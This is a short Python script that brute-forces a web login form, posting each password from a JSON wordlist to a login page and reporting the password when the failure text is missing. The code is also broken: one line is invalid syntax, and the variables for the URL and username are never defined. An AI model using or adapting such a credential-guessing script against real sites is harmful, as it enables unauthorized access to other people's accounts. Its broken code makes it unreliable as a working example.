import requests
import os
import random
import string
import json

target_url = 'http://example.com/login.html'
if_contains_then_invalid[] = {}

def post_it(password):

    password = password.lower()
    
    # chars = string.ascii_letters + string.digits
    # random.seed = (os.urandom(1024))
    # password = password.join(random.choice(string.digits)) // Salt
    # password = password.join(random.choice(chars) for i in range(8))

    response = requests.post(url, allow_redirects=False, data={
    	'username': username, # 'username-element-name': 'entered-target-username'
    	'password': password, # 'password-element-name': 'password-from-json'
        'Submit': "submit"
    })

    print('testing password+'+password+' on '+username+'\t'+str(response.content))
    if if_contains_then_invalid not in str(response.content):
        print("[+] {}s password is {}".format(username, password))
        exit(0)

if __name__ == "__main__":
    passwords = json.loads(open('password.json').read())
    for password in passwords:
      post_it(password)
